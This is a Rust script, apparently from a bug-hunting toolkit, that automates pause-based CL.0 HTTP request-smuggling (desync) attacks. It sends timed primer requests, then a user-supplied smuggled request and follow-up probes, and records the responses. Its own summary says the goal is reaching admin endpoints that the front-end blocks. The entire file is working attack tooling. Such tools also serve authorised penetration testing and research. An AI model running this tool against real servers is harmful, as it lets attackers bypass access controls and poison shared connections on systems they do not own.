#!/usr/bin/env rust-script
//! name: pause_sweep
//! description: Pause-based CL.0 desync grid probe - for every (primer path, pause) cell it opens its own TLS connection, sends a CL.0 primer whose Content-Length equals the smuggled request, holds the pause window while continuously timestamping any byte the front-end returns (Apache reads the upstream response only after the request body is finished, so a mid-pause response is rare and must be timestamped, not waited for), then sends the smuggled request and records everything that follows - so the cell where the back-end abandons the request on timeout and parses the leftover bytes as a fresh request is identifiable in one envelope.
//! version: 1.0.0
//! args: <url> --paths p1,p2,... [--pauses 3000,30000] --smuggle 'RAW with {HOST}' [--probe 'RAW with {HOST}/{I}'] [--probes N] [--probe-wait-ms N] [--read-ms N] [--preview N] [--out FILE] [--selftest]
//! keywords: 漏洞猎手套件, smuggling, desync, pause, cl0, sweep, grid, apache
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::io::{ErrorKind, Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

const SLICE_MS: u64 = 800;

trait ReadWrite: Read + Write {}
impl<T: Read + Write> ReadWrite for T {}

fn unescape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut it = s.chars();
    while let Some(c) = it.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match it.next() {
            Some('r') => out.push('\r'),
            Some('n') => out.push('\n'),
            Some('t') => out.push('\t'),
            Some('0') => out.push('\0'),
            Some('\\') => out.push('\\'),
            Some(other) => out.push(other),
            None => out.push('\\'),
        }
    }
    out
}

fn connect(host: &str, port: u16, tls: bool) -> Result<Box<dyn ReadWrite>, String> {
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect {host}:{port}: {e}"))?;
    let _ = tcp.set_read_timeout(Some(Duration::from_millis(SLICE_MS)));
    let _ = tcp.set_write_timeout(Some(Duration::from_secs(10)));
    if tls {
        let mut roots = rustls::RootCertStore::empty();
        roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
        let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
        let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
        let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls init: {e}"))?;
        Ok(Box::new(rustls::StreamOwned::new(conn, tcp)))
    } else {
        Ok(Box::new(tcp))
    }
}

fn status_line(bytes: &[u8]) -> String {
    let text = String::from_utf8_lossy(bytes);
    match text.split("\r\n").find(|l| l.starts_with("HTTP/")) {
        Some(l) => l.trim().to_string(),
        None => format!("<{}B no-status>", bytes.len()),
    }
}

/// Every HTTP status line in a byte run (a run can hold several responses).
fn status_lines(bytes: &[u8]) -> Vec<String> {
    let text = String::from_utf8_lossy(bytes);
    let mut out: Vec<String> = Vec::new();
    for l in text.split("\r\n") {
        if l.starts_with("HTTP/") {
            let s = l.trim();
            if out.last().map(|p| p == s).unwrap_or(false) {
                continue;
            }
            out.push(s.to_string());
        }
    }
    out
}

struct Chunk {
    at_ms: u128,
    bytes: Vec<u8>,
    eof: bool,
}

fn chunk_json(chunks: &[Chunk], preview: usize) -> Vec<Value> {
    chunks
        .iter()
        .map(|c| {
            json!({"at_ms": c.at_ms as u64, "bytes": c.bytes.len(), "eof": c.eof,
                   "status_lines": status_lines(&c.bytes),
                   "preview": String::from_utf8_lossy(&c.bytes).chars().take(preview).collect::<String>()})
        })
        .collect()
}

/// Read for `window_ms`, recording every data run with its arrival timestamp.
fn read_loop(stream: &mut Box<dyn ReadWrite>, start: Instant, window_ms: u64) -> Vec<Chunk> {
    let mut chunks: Vec<Chunk> = Vec::new();
    let mut buf = [0u8; 16384];
    loop {
        if start.elapsed() >= Duration::from_millis(window_ms) {
            break;
        }
        match stream.read(&mut buf) {
            Ok(0) => {
                chunks.push(Chunk { at_ms: start.elapsed().as_millis(), bytes: Vec::new(), eof: true });
                break;
            }
            Ok(n) => chunks.push(Chunk { at_ms: start.elapsed().as_millis(), bytes: buf[..n].to_vec(), eof: false }),
            Err(e) if e.kind() == ErrorKind::WouldBlock || e.kind() == ErrorKind::TimedOut => {}
            Err(_) => {
                chunks.push(Chunk { at_ms: start.elapsed().as_millis(), bytes: Vec::new(), eof: true });
                break;
            }
        }
    }
    chunks
}

#[allow(clippy::too_many_arguments)]
fn case(
    host: &str,
    port: u16,
    tls: bool,
    path: &str,
    pause_ms: u64,
    smuggle: &str,
    read_ms: u64,
    preview: usize,
    probe: &Option<String>,
    probes: usize,
    probe_wait_ms: u64,
) -> Value {
    let mut stream = match connect(host, port, tls) {
        Ok(s) => s,
        Err(e) => return json!({"path": path, "pause_ms": pause_ms, "error": e}),
    };
    let primer = format!(
        "POST {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n",
        smuggle.len()
    );
    let t0 = Instant::now();
    if let Err(e) = stream.write_all(primer.as_bytes()) {
        return json!({"path": path, "pause_ms": pause_ms, "error": format!("write primer: {e}")});
    }
    let _ = stream.flush();

    let held = read_loop(&mut stream, t0, pause_ms);
    let sent_at = t0.elapsed().as_millis() as u64;
    let mut after: Vec<Chunk> = Vec::new();
    if let Err(e) = stream.write_all(smuggle.as_bytes()) {
        return json!({"path": path, "pause_ms": pause_ms, "error": format!("write smuggle: {e}")});
    }
    let _ = stream.flush();
    after.extend(read_loop(&mut stream, t0, sent_at as u64 + read_ms));

    // Follow-up probes: the front-end takes only one upstream response per client request,
    // so a smuggled response is recovered by the NEXT request that reuses the pooled socket.
    let mut probe_stages: Vec<Value> = Vec::new();
    if let Some(ptpl) = probe {
        std::thread::sleep(Duration::from_millis(probe_wait_ms));
        for i in 0..probes.max(1) {
            let p = unescape(ptpl).replace("{HOST}", host).replace("{I}", &i.to_string());
            let at = t0.elapsed().as_millis() as u64;
            if stream.write_all(p.as_bytes()).is_err() {
                probe_stages.push(json!({"index": i, "sent_at_ms": at, "error": "write failed"}));
                break;
            }
            let _ = stream.flush();
            let chunks = read_loop(&mut stream, t0, at + read_ms);
            let bytes: usize = chunks.iter().map(|c| c.bytes.len()).sum();
            probe_stages.push(json!({"index": i, "sent_at_ms": at, "bytes": bytes, "chunks": chunk_json(&chunks, preview)}));
        }
    }

    let held_bytes: usize = held.iter().map(|c| c.bytes.len()).sum();
    let after_bytes: usize = after.iter().map(|c| c.bytes.len()).sum();
    json!({
        "path": path,
        "pause_ms": pause_ms,
        "primer_len": primer.len(),
        "smuggle_len": smuggle.len(),
        "smuggle_sent_at_ms": sent_at,
        "held_bytes": held_bytes,
        "after_bytes": after_bytes,
        "held": chunk_json(&held, preview),
        "after": chunk_json(&after, preview),
        "probes": probe_stages,
    })
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let ok = status_line(b"HTTP/1.1 200 OK\r\n\r\n").starts_with("HTTP/1.1 200")
            && status_lines(b"HTTP/1.1 100 X\r\nHTTP/1.1 408 Y\r\n") == vec!["HTTP/1.1 100 X".to_string(), "HTTP/1.1 408 Y".to_string()];
        pi_rust_lib::report::success("pause_sweep", json!({"selftest": if ok { "ok" } else { "fail" }}), "grid probe roots: status-line extraction").unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut url = String::new();
    let mut paths: Vec<String> = Vec::new();
    let mut pauses: Vec<u64> = Vec::new();
    let mut smuggle = String::new();
    let mut read_ms: u64 = 10_000;
    let mut preview: usize = 400;
    let mut probe: Option<String> = None;
    let mut probes: usize = 1;
    let mut probe_wait_ms: u64 = 1_500;
    let mut out: Option<String> = None;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--paths" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    paths = v.split(',').map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
                }
            }
            "--pauses" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    pauses = v.split(',').filter_map(|s| s.trim().parse().ok()).collect();
                }
            }
            "--smuggle" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    smuggle = v.clone();
                }
            }
            "--read-ms" => {
                i += 1;
                read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(read_ms);
            }
            "--preview" => {
                i += 1;
                preview = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(preview);
            }
            "--probe" => {
                i += 1;
                probe = args.get(i).cloned();
            }
            "--probes" => {
                i += 1;
                probes = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(probes);
            }
            "--probe-wait-ms" => {
                i += 1;
                probe_wait_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(probe_wait_ms);
            }
            "--out" => {
                i += 1;
                out = args.get(i).cloned();
            }
            other if !other.starts_with("--") && url.is_empty() => url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if paths.is_empty() {
        paths = vec!["/".to_string()];
    }
    if pauses.is_empty() {
        pauses = vec![3000];
    }
    if url.is_empty() || smuggle.is_empty() {
        pi_rust_lib::report::failure("pause_sweep", "usage", "pause_sweep <url> --paths p1,p2 [--pauses ms,ms] --smuggle 'RAW with {HOST}'");
        std::process::exit(2);
    }

    let parsed = Url::parse(&url).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = parsed.host_str().unwrap_or("").to_string();
    let port = parsed.port().unwrap_or(if parsed.scheme() == "https" { 443 } else { 80 });
    let tls = parsed.scheme() == "https";
    let smuggle_body = unescape(&smuggle).replace("{HOST}", &host);

    let mut handles = Vec::new();
    for path in &paths {
        for pause in &pauses {
            let host = host.clone();
            let path = path.clone();
            let smuggle_body = smuggle_body.clone();
            let probe = probe.clone();
            let pause = *pause;
            handles.push(std::thread::spawn(move || {
                case(&host, port, tls, &path, pause, &smuggle_body, read_ms, preview, &probe, probes, probe_wait_ms)
            }));
        }
    }
    let mut cells: Vec<Value> = handles.into_iter().filter_map(|h| h.join().ok()).collect();
    cells.sort_by_key(|c| {
        let p = c.get("pause_ms").and_then(|v| v.as_u64()).unwrap_or(0);
        let path = c.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string();
        (p, path)
    });

    if let Some(p) = out {
        let pretty = Value::Array(cells.clone()).to_string();
        let _ = std::fs::write(p, pretty);
    }

    let post_smuggle_lines: Vec<String> = cells
        .iter()
        .flat_map(|c| c.get("after").and_then(|v| v.as_array()).cloned().unwrap_or_default())
        .flat_map(|c| c.get("status_lines").and_then(|v| v.as_array()).cloned().unwrap_or_default())
        .filter_map(|v| v.as_str().map(|s| s.to_string()))
        .collect();
    let probe_lines: Vec<String> = cells
        .iter()
        .flat_map(|c| c.get("probes").and_then(|v| v.as_array()).cloned().unwrap_or_default())
        .flat_map(|p| p.get("chunks").and_then(|v| v.as_array()).cloned().unwrap_or_default())
        .flat_map(|c| c.get("status_lines").and_then(|v| v.as_array()).cloned().unwrap_or_default())
        .filter_map(|v| v.as_str().map(|s| s.to_string()))
        .collect();

    pi_rust_lib::report::success(
        "pause_sweep",
        json!({"url": format!("{}://{}", if tls { "https" } else { "http" }, host), "cases": cells.len(), "smuggle_len": smuggle_body.len(), "post_smuggle_status_lines": post_smuggle_lines, "probe_status_lines": probe_lines, "grid": cells}),
        "a cell whose post-smuggle status lines differ from the plain response (e.g. an admin 200 or a 302 that the front-end blocks) is the desync vector",
    )
    .unwrap_or(());
}
